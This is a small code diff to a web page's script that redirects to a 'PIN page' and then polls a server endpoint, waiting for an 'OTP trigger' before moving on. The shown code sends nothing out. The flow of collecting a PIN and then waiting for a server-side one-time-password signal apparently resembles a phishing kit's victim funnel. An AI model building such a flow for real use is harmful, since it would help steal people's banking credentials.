@@ -25,22 +25,22 @@
 <div class="footer"></div>
 
 <script>
-const first = localStorage.getItem("firstProcess");
 
-if (first === "yes") {
+// FIRST PROCESS → GO TO PIN PAGE
+if (localStorage.getItem("firstProcess") === "yes") {
 
-    // FIRST TIME → GO TO PIN
     localStorage.removeItem("firstProcess");
 
     setTimeout(() => {
         window.location.href = "step5.html";
     }, 5000);
+}
 
-} else {
+// AFTER PIN → WAIT FOR OTP TRIGGER
+if (localStorage.getItem("fromPin") === "yes") {
 
-    // AFTER PIN → WAIT FOR OTP
     setInterval(() => {
-        fetch(window.location.origin + "/otp-status")
+        fetch("/otp-status")
         .then(res => res.json())
         .then(data => {
             if (data.otp === 5 || data.otp === 6) {
@@ -49,8 +49,8 @@ if (first === "yes") {
             }
         });
     }, 2000);
-
 }
+
 </script>
 
 </body>
